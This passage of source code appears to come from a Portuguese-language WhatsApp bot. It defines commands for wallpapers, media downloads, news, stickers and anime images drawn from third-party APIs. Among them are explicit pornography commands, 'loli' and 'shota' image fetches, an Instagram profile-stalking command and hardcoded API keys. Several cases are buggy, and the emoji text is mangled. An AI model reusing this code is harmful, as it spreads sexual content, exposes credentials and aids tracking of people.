amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;


case 'walldark':
case 'Walldark': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const walldarkData = fs.readFileSync('./IMAGENS/walldark.js');
const jsonData = JSON.parse(walldarkData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'walllaranja':
case 'Walllaranja': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const walllaranjaData = fs.readFileSync('./IMAGENS/walllaranja.js');
const jsonData = JSON.parse(walllaranjaData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallmarrom':
case 'Wallmarrom': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallmarromData = fs.readFileSync('./IMAGENS/wallmarrom.js');
const jsonData = JSON.parse(wallmarromData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallmulti':
case 'Wallmulti': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallmultiData = fs.readFileSync('./IMAGENS/wallmulti.js');
const jsonData = JSON.parse(wallmultiData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallpreto':
case 'Wallpreto': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallpretoData = fs.readFileSync('./IMAGENS/wallpreto.js');
const jsonData = JSON.parse(wallpretoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallrosa':
case 'Wallrosa': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallrosaData = fs.readFileSync('./IMAGENS/wallrosa.js');
const jsonData = JSON.parse(wallrosaData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallroxo':
case 'Wallroxo': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallroxoData = fs.readFileSync('./IMAGENS/wallroxo.js');
const jsonData = JSON.parse(wallroxoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallverde':
case 'Wallverde': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallverdeData = fs.readFileSync('./IMAGENS/wallverde.js');
const jsonData = JSON.parse(wallverdeData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;

case 'wallvermelho':
case 'Wallvermelho': {
reply(`ùóòùòÄùòÅùóºùòÇ ùóØùòÇùòÄùó∞ùóÆùóªùó±ùóº ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùóÆùó¥ùòÇùóÆùóøùó±ùó≤ ùòÇùó∫ ùóΩùóºùòÇùóæùòÇùó∂ùóªùóµùóº üëΩ`);
const wallvermelhoData = fs.readFileSync('./IMAGENS/wallvermelho.js');
const jsonData = JSON.parse(wallvermelhoData);
const randIndex = Math.floor(Math.random() * jsonData.length);
const randKey = jsonData[randIndex];
const imagem = await getBuffer(randKey.result);
amy.sendMessage(from, { image: imagem, caption: `‚Ä¢„Äå ${pushname} „Äç\n‚Ä¢ ùóîùóæùòÇùó∂ ùó≤ùòÄùòÅùóÆ ùóº ùòÄùó≤ùòÇ ùòÑùóÆùóπùóπùóΩùóÆùóΩùó≤ùóø ùó≤ùòÄùóΩùó≤ùóøùóº ùóæùòÇùó≤ ùó¥ùóºùòÄùòÅùó≤ üòç` }, { quoted: info });
}
break;
case 'brasileirao': case 'Brasileir√£o':
try {
ABC = await fetchJson(`https://tohsaka.tech/api/brasileirao?apitoken=S`);
RST = "‚öΩÔ∏èüìä *Tabela Brasileir√£o:*\n‚Äì\n"
RST += ABC.resultado.map((v, index) => `${index+1}¬∞) Time: *${v.equipe}*\n‚Ä¢ Pontos alcan√ßados pelo time: *${v.pontos}*\n‚Ä¢ Jogos jogados pelo time: *${v.jogosJogados}*`).join("\n‚Äì\n")
return reply(RST)
} catch(e) {
return reply("Ocorreu um erro")
}
break;
//ùêèùêÑùêëùêìùêÑ ùêÉùêÑ ùêÄùêãùêìùêÑùêëùêÄùêÇÃßùêÄÃÉùêé ùêÉùêÑ ùêàùêåùêÄùêÜùêÑùêçùêí
case 'gerarlink':
YSG = isQuotedVideo || isQuotedImage || isQuotedAudio || isImage || isVideo
if(!YSG) {
reagir(from, "‚ö†Ô∏è")
reply(`Voc√™ precisa marcar uma imagem, v√≠deo ou √°udio de at√© 200MB com o comando ou reply uma imagem ou v√≠deo e colocar na legenda: \`${prefix + command}\`.`)
return
}
if((isMedia && info.message.imageMessage.fileLenght < 209715200 || isQuotedImage && info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.fileLength < 209715200) && !q.length <= 1) { 
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
owgi = await getFileBuffer(boij, 'image')
await sleep(1000)
reagir(from, "üîó")
res = await upload(owgi)
reply(res) 
} else if((isMedia && info.message.videoMessage.fileLength < 209715200 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 209715200) && !q.length <= 1) { 
boij = isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : info.message.videoMessage
owgi = await getFileBuffer(boij, 'video')
await sleep(1000)
reagir(from, "üîó")
res = await upload(owgi)
reply(res)
} else if(isQuotedAudio && info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage.fileLength < 209715200) {
boij = isQuotedAudio ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.audioMessage : info.message.audioMessage
owgi = await getFileBuffer(boij, 'audio')
await sleep(1000)
reagir(from, "üîó")
res = await upload(owgi)
reply(res)
} else {
reagir(from, "‚ùó")
reply('O gerador de link s√≥ funciona se o arquivo estiver abaixo de 200MB.')
}
break

case 'gerarlink2':
case 'videopralink2':
case 'imgpralink2':
try {
if((isMedia && !info.message.videoMessage || isQuotedImage) && !q.length <= 1) { 
reply("aguarde um momento")
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
owgi = await FileBuffer(boij, 'image')
res = await upload2(owgi)
reply(res) 
} else if((isMedia && info.message.videoMessage.seconds < 30 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 30) && !q.length <= 1) { 
reply("aguarde um momento")
boij = isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : info.message.videoMessage
owgi = await FileBuffer(boij, 'video')
res = await upload2(owgi)
reply(res)
} else {
reply("Voc√™ deve marcar uma imagem, ou um v√≠deo de at√© 30 segundos..")
}
} catch {
reply("ocorreu um erro ao converter em link")
}
break
  
  
case 'fullhd':
reagir(from, "‚ú®")
if((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
reply(`Alterando a qualidade da foto para *HD*, aguarde um pouco!`)
link = await upload2(base64)
data2 = await fetchJson(`https://aemt.me/remini?url=${link}&resolusi=4`)
amy.sendMessage(from, {image: {url: data2.url}}, {quoted: info}).catch(e => {
return reply(mess.error())
})
} else {
reply('Mencione uma imagem para atribuir o efeito a foto.')
}
break  
  
case 'tohd': case 'hd':
if((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
b = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
reply(`Alterando a qualidade da foto para *HD*, aguarde um pouco!`)
fs.writeFileSync("hd.jpeg", base64);
var ft = ('./hd.jpeg')
link = await upload2(ft)
amy.sendMessage(from, {image: {url: `https://random-apis.shop/remini?link=${link}`}}, {quoted: info}).catch(e => {
return reply(`um erro foi detectado: ${e}`);
console.log(e)
})
} else {
reply('Mencione uma imagem para atribuir o efeito a foto.')
}
break//by sr.wesley
  
case 'lgbt': 
case 'hitler':
case 'pixelate': 
case 'sepia': 
case 'trash':
case 'wanted': 
case 'wasted': 
case 'rip': 
case 'jail':
case 'facepalm':
case 'invert': 
case 'del': 
case 'circle': 
case 'beautiful':
case 'blur':
case 'bolsonaro': 
case 'bobross': 
case 'mms': 
case 'comunismo':
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage;
imagem = await downloadContentFromMessage(post, 'image');
base64 = Buffer.from([]);
for await (const send of imagem) {
base64 = Buffer.concat([base64, send]);
}
reagir(from, "üÜô")
const amyID = '400116076ba4b73'; 
const imgurUrl = 'https://api.imgur.com/3/upload';    
const response = await fetch(imgurUrl, {
method: 'POST',
headers: {
Authorization: `amy-ID ${amyID}`,
Accept: 'application/json',
},
body: new URLSearchParams({
image: base64.toString('base64'),
type: 'base64'
})
});
const result = await response.json();
const link = result.data.link;
amy.sendMessage(from, {image: {url:`https://api.cariflex.xyz/api/canvas/${command}?link=${link}`}}, {quoted: info})
} else {
reply("Mencione uma imagem para atribuir o efeito √† foto.");
}
break;

case 'hentai-vid'://by tzn
try {//by modelagem 
const gozeiprahentai = await fetchJson(`https://api.cariflex.xyz/api/random/hentai?apikey=${API_CARIFLEX}`);
if (gozeiprahentai.resultado && gozeiprahentai.resultado.length > 0) {
const gozeinocllr = gozeiprahentai.resultado[0];
await amy.sendMessage(sender, {video: {url: gozeinocllr.video_2}, caption: `
T√≠tulo: ${gozeinocllr.title}
Categoria: ${gozeinocllr.category}
Visualiza√ß√µes: ${gozeinocllr.views_count}
Compartilhamentos: ${gozeinocllr.share_count}`, 
mimetype: "video/mp4"}, {quoted: info});
} else {//by tzn
reply('encontrei video n');
}
} catch {
    reply('broxou, pae');
}
break;

case 'hentai-gay':
case 'lesbian':
case 'ass':
case 'bdms':
case 'blowjob': 
case 'cuckold':
case 'cum':
case 'ero':
case 'femdom':
case 'foot': 
case 'gankbang':
case 'glasses':
case 'hentai':
case 'jahy':
case 'manga':
case 'neko':
case 'orgy':
case 'panties':
case 'pussy':
case 'neko2':
case 'tentacles':
case 'thighs':
case 'yuri':
case 'zettai':
 // by CRICIAN JS
reagir(from, "üîû")
hentai = await getBuffer(`https://api.cariflex.xyz/nsfw/${command}?apikey=${API_CARIFLEX}`)
await amy.sendMessage(sender, {image: hentai, thumbnail: null}, {quoted: info}).catch(e => {
reagir(from, '‚ùå')
})
break

case 'insta_video': 
case 'instavideo':
try {
if(q.length < 5) return reply('Por favor, forne√ßa um link de um(a) *foto, video, reels ou story* do Instagram.');
data = await fetchJson(`https://random-apis.online/api/instagram/v2?url=${q}`)
for (let i = 0; i < data.result.length; i++) {
let dmt = data.result[i].type
mimety = dmt === "video" ? "video/mp4" : dmt === "webp" ? "image/webp" : dmt === "image" ? "image/jpeg" : dmt === "audio" ? "audio/mpeg" : "video/mp4"
amy.sendMessage(from, {[mimety.split("/")[0]]: {url: data.result[i]._url}, mimetype: mimety}, {quoted: info}).catch(e => {
return reply(mess.error())
})
}
} catch (e) {
return reply(mess.error())
}
break

case 'insta_audio': 
case 'instaaudio':
try {
if(q.length < 5) return reply('Por favor, forne√ßa um link de um(a) *foto, video, reels ou story* do Instagram.');
data = await fetchJson(`https://random-apis.online/api/instagram/v2?url=${q}`)
for (let i = 0; i < data.result.length; i++) {
let dmt = data.result[i].type
amy.sendMessage(from, {audio: {url: data.result[i]._url}, mimetype: "audio/mp4"}, {quoted: info})
}
} catch (e) {
return reagir(from, "‚ùå")
}
break

case 'ptvmsg':
if (!isQuotedVideo && !info.message.videoMessage) {
return reply('Marque um v√≠deo/gif que voc√™ deseja converter para mensagem de v√≠deo.')}
amy.relayMessage(from, {ptvMessage: isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage }, {})
break

case 'instagram': case 'instareels':
if (!q) return reply ('Por favor, forne√ßa o link do v√≠deo de um *reels do Instagram*.');
reply("espere um momento ");
try {
setTimeout(() => {reagir(from, "üò∏")}, 100)
result = await fetchJson(`https://api.cariflex.xyz/api/instagram?url=${q}`);
amy.sendMessage(from, {video: {url: result.resultado}}, {quoted: info})
} catch(e) {
reply(" erro ao baixar")
}
break;


case 'ytmp3-amy': 
if(!q) return reply(`Cade o link do √°udio?`)
reagir(from, `üÜô`)// ô è ·¥Ñ Ä…™·¥Ñ…™·¥Ä…¥ ·¥äs
api = await fetchJson(`https://api.cariflex.xyz/api/ytmp4-8?url=${q}`)
amy.sendMessage(from, {audio: {url: `${api.resultado.dl_link}`}, mimetype: "audio/mpeg"},{quoted: info}).catch(err => {
reagir(from, "‚ùå")
})
break 
//ùêèùêÄùêëùêìùêÑ ùêÉùêÑ ùêÉùêéùêñùêçùêãùêéùêÄùêÉùêí ùêÇùêÄùêíùêÑùêí.......... 

case 'pinterest2':
if (!q) return reply('Digite o nome da imagem que voc√™ quer buscar')
reagir(from, 'üÜô') 
for (let i = 0; i < 3; i++) {
blap = await getBuffer(`https://api.cariflex.xyz/api/pinterest?text=${q}`)
await amy.sendMessage(from, {image: blap, thumbnail: null}, {quoted: info}).catch(e => {
reagir(from, '‚ùå')
})
}
break

case 'gerarqr': 

try {

if(!q) return reply(`Digite o nome para gerar o qr`)
reply( "Gerando seu qrcode") 

let cari = await getBuffer(`https://api.cariflex.xyz/api/outros/qrcode?texto=${q}`)

await amy.sendMessage(from, 
{image: cari},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break;

case 'pinterest':

try {

if(!q) return reply(`Digite o nome da imagem que vc quer buscar`)
reagir(from, "üÜô")

let blap = await getBuffer(`https://api.cariflex.xyz/api/pinterest?text=${q}`)

await amy.sendMessage(from, 
{image: blap},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break;


case 'gimage': case 'Gimage':
if(!q) return reply("cade o nome da imagem?")
try {
await sleep(2000)
dados = await fetchJson(`https://api.cariflex.xyz/api/gimage?txt=${q}`)
api = dados.resultado
reagir(from,"üÜô")
 amy.sendMessage(from, {image: {url: `${api.result[0].url}`}, caption: `TITULO: ${api.result[0].title}`}, {quoted: info})
} catch (error) {
reagir(from, "‚ùå")
}
break

case 'gerar-image': 
case 'image-ai':
if(!q) return reply(`Digite o nome para gerar a imagem`)
reply('estou gerando sua imagem')
api = await fetchJson(`https://api.cariflex.xyz/api/ai/gerar/image?query=${q}&apikey=cariflex`)
await amy.sendMessage(from, {image: {url: `${api.image}`}}, {quoted: info}).catch(e => {
reply('nao foi poss√≠vel gerar a imagem')
})
break

case 'logo-tube': case 'yt': 
reagir(from, "üÜô")
if (!q) return reply(" adicione seu coment√°rio ")
ppimg = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
try {
tezeeni = await getBuffer(`https://api.cariflex.xyz/api/canvas/youtube?nome=${pushname}&msg=${q}&foto=${ppimg}`)
amy.sendMessage(from,{image:tezeeni},{quoted: info}).catch(e => {
reply("Ocorreu um erro ao gerar a imagem. Verifique se sua key est√° funcionando e tente novamente.")
})
} catch (e) {
console.log(e)
}
break

case 'amazon':
case 'Amazon':
reagir(from, "üÜô")
if(!q) return reply(`informe o nome do produto`)
AM = await getBuffer(`https://api.cariflex.xyz/api/amazon?nome=${q}`)
AZ = `üéØ TITULO: ${AM.resultado[0].titulo}\nüí∏ VALOR: ${AM.resultado[0].valor}`
amy.sendMessage(from,{image:{url: `${AM.resultado[0].imagem}`}, caption: AZ},{quoted: info})
break

case 'cosplay': 
case 'Cosplay':

try {
reagir(from, "üÜô")

let cosp = await getBuffer(`https://api.cariflex.xyz/random/cosplay`)

await amy.sendMessage(from, 
{image: cosp}, 
{quoted: info}) 

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'get-html': case 'gethtml':

try {

if(!q) return reply("cade o url do site") 

reply("Aguarde um momento enquanto extraio o html")

let cari = await fetchJson(`https://api.cariflex.xyz/api/outros/get-html?url=${q}`)

await amy.sendMessage(from, 
{text:`${cari.resultado}`},
 {quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'G1':
case 'g1':
amy.sendMessage(from, { react: { text: `üîé`, key: info.key }})
try {//By:  CRICIAN JS
dados = await fetchJson(`https://api.cariflex.xyz/api/noticias/globo?apikey=${API_CARIFLEX}`)
api = dados.pesquisa
amy.sendMessage(from, {image: {url: `${api.resultado[0].imagem}`}, 
caption: `*Noticia* - ${api.resultado[0].noticia}
*Url* - ${api.resultado[0].link}
`}, {quoted: info})
} catch (error) {
reagir(from, "‚ùå")
}
break

case 'poder360':
case 'Poder360':
amy.sendMessage(from, { react: { text: `üîé`, key: info.key }})
try {//By:  CRICIAN JS
dados = await fetchJson(`https://api.cariflex.xyz/api/noticias/poder360?apikey=${API_CARIFLEX}`)
api = dados.pesquisa
amy.sendMessage(from, {image: {url: `${api.resultado[0].imagem}`}, 
caption: `*Noticia* - ${api.resultado[0].noticia}
*Url* - ${api.resultado[0].link}
`}, {quoted: info})
} catch (error) {
reagir(from, "‚ùå")
}
break

case 'jovempan':
case 'Jovempan':
amy.sendMessage(from, { react: { text: `üîé`, key: info.key }})
try {//By:  CRICIAN JS
dados = await fetchJson(`https://api.cariflex.xyz/api/noticias/jovempan?apikey=${API_CARIFLEX}`)
api = dados.pesquisa
amy.sendMessage(from, {image: {url: `${api.resultado[0].imagem}`}, 
caption: `*Noticia* - ${api.resultado[0].noticia}
*Url* - ${api.resultado[0].link}
`}, {quoted: info})
} catch (error) {
reagir(from, "‚ùå")
}
break

case 'yt-search':
case 'Yt-serach':
reagir(from, "üÜô")
if(!q) return reply(`Informe o nome da Musica para pesquisa`)
api = await fetchJson(`https://api.cariflex.xyz/api/ytsrc?q=${q}`)
bla = `ùöÉùô∏ùöÉùöÑùôªùôæ ‚ßΩ: ${api.resultado[0].title}
ùô≥ùô¥ùöÇùô≤ùöÅùô∏ùô≤Ãßùô∞ÃÉùôæ ‚ßΩ ${api.resultado[0].description}
ùöÉùô¥ùôºùôøùôæ ‚ßΩ ${api.resultado[0].seconds}
ùöÑùöÅùôª ‚ßΩ ${api.resultado[0].url}`
amy.sendMessage(from,{image:{url: `${api.resultado[0].image}`}, caption: bla},{quoted: info})
break

case 'porno-gratis': case'porn-gratis':
if (!q) return reply(`informe o nome da pesquisa`)
reagir(from,`üîé`) 
try {
porn = await fetchJson(`https://api.cariflex.xyz/api/pornogratis?q=${q}`)
amy.sendMessage(from, {image: {url: `${porn.resultado.img}`}, caption: `TITULO: ${porn.resultado.nome}\nURL: ${porn.resultado.link}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'toukachan': 
case 'megumin':
case 'keneki':
case 'onepiece':
case 'tsunade':
case 'sasuke':
case 'sakura':
case 'madara':
case 'itachi':
case 'inori':
case 'hestia':
case 'chitoge':
case 'emilia':
case 'avusawa':
case 'asuna':
case 'deidara':
case 'anna':
case 'rize':
case 'nezuko':
case 'sagari':
case 'minato':
case 'naruto':
case 'hinata':
case 'elaina':
case 'erza':
case 'eba':
case 'shinka':
case 'kagura':
case 'shina':
case 'isuku':
case 'gremory':
case 'akiyama':
case 'mikasa':
case 'kotori':
case 'kaga':
case 'shizuka':
case 'kaori':
case 'boruto':
case 'chiho':
case 'tejina':
case 'yumeko':
case 'shinomiya':
case 'yotsuba':
case 'shota':
case 'loli':
case 'waifu':

try {

let animes = await getBuffer(`https://api.cariflex.xyz/random/${command}`)

await amy.sendMessage(from, 
{image: animes}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break



case 'mediafire':
if(!q.includes("mediafire.com")) return reply("Faltando o link do mediafire para download do arquivo, cade?");
ABC = await fetchJson(`https://tohsaka.tech/api/mediafire?url=${q}&apitoke=xReis`)
encurt = await axios.get(`https://tinyurl.com/api-create.php?url=${ABC.resultado[0].link}`)
amy.sendMessage(from, {document: {url: ABC.resultado[0].link}, mimetype: "application/"+ABC.resultado[0].mime, fileName: ABC.resultado[0].nama}).catch(e => {
reagir (from,"‚ùå")
return reply(" Ocorreu um erro")  
})
break;

case 'igtalk':
case 'igstalk':
if (!q) return reply(`*Cad√™ o @ do stalke?*\nExemplo: ${prefix+command} crician_16y`)
amy.sendMessage(from, { react: { text: `üîé`, key: info.key }})
reply(`Aguarde..., estou Stalkeando o usu√°rio ${q}`)
try {//By: TznAftkk & by CRICIAN JS
api = await fetchJson(`https://api.cariflex.xyz/api/igstalk?q=${q}`)
amy.sendMessage(from, {image: {url: `${api.resultado.imagem}`}, 
caption: `
           ‚ô•    [ *INSTAGRAM* ]     ‚ô•
‚îÉ${prefix}‚úèÔ∏è *Nome* - ${api.resultado.nome}
‚îÉ${prefix}üòç *Biografia* - ${api.resultado.bio}
‚îÉ${prefix}üíñ *Seguidores* - ${api.resultado.seguidores}
‚îÉ${prefix}üéä *Seguindo* - ${api.resultado.seguindo}
‚îÉ${prefix}üïí *Url* - ${api.resultado.url}
`}, {quoted: info})
} catch (error) {
reagir(from, "‚ùå")
}
break

case 'figu_emoji': 
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figuss() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_emoji?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figuss()
}
break

case 'figu_roblox':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
async function figu_roblox() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_roblox?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_roblox()
}
break

case 'figu_raiva':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas est√£o sendo enviadas em seu pv.`)
